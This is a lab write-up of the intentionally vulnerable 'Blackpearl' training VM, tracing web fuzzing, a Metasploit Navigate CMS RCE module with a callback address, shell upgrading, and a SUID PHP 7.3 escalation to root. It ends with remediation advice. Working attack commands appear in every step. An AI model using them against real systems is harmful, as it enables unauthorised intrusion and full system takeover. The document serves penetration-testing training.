FIELD NOTES / ISOLATED TRAINING LAB

Blackpearl
From foothold to root.

Intentionally vulnerable, isolated training VM. Commands are lab-only; LAB_TARGET and LAB_KALI stand for the target and callback addresses on that isolated network. Credentials and unrelated local data are omitted.

Result: root access. Navigate CMS 2.8 supplied a www-data foothold; a privileged PHP 7.3 interpreter crossed the local privilege boundary.

Attack path

Hostname discovery → virtual host → FFUF → Navigate CMS RCE → www-data → LinPEAS / SUID PHP → root.

01 / Resolve the host, filter the noise

After mapping the lab hostname in /etc/hosts, HTTP returned 200 OK from Nginx 1.14.2. DNSRecon was used, but its exact invocation and returned records were not retained.

getent hosts blackpearl.tcm
curl -I http://blackpearl.tcm
ffuf -u http://blackpearl.tcm/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -fs 652 -s

Many HTTP 200 responses shared a 652-byte body; filtering that size removed repeated noise. /secret returned a distinct 209-byte response. A subsequent pass found /navigate and Navigate CMS 2.8. The CMS, not /secret, became the initial-access path.

02 / Establish the web-service foothold

The report records successful Navigate CMS exploitation and whoami → www-data. The sequence below reconstructs the configuration; TARGETURI is inferred from discovery, and the complete successful module invocation was not preserved.

# Metasploit — reconstructed configuration
search navigate_cms
use exploit/multi/http/navigate_cms_rce
set RHOSTS <LAB_TARGET>
set VHOST blackpearl.tcm
set TARGETURI /navigate/
set LHOST <LAB_KALI>
show options
exploit

03 / Identify the privileged interpreter

A Python PTY improved shell interaction. Sudo and history checks yielded no useful path; LinPEAS directed attention to PHP 7.3. The following captures the enumeration approach, not a complete terminal transcript.

python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo -l
history
./linpeas.sh
find / -type f -perm -4000 2>/dev/null
ls -l /usr/bin/php7.3

04 / Verify root execution

An initial attempt failed on shell quoting. The corrected command below is preserved in the successful-session evidence. PHP replaced its process with a shell using privilege preservation:

/usr/bin/php7.3 -r 'pcntl_exec("/bin/sh", ["-p"]);'
# whoami
root

The identity check confirms root. A low real UID can coexist with an elevated effective UID, but the example id output in the longer report was explanatory—not captured evidence.

Findings → fixes

  • CMS remote code execution: upgrade or replace the vulnerable application; reduce exposed functionality and service-account permissions.
  • Privileged interpreter: remove unnecessary SUID permissions from PHP; audit privileged executable ownership and permissions.
  • Validation: retest application execution and local escalation separately after remediation.

Evidence limits

Root verification is recorded. DNS commands, PTY setup, and parts of the CMS configuration are reconstructed; no remediation retest is claimed.
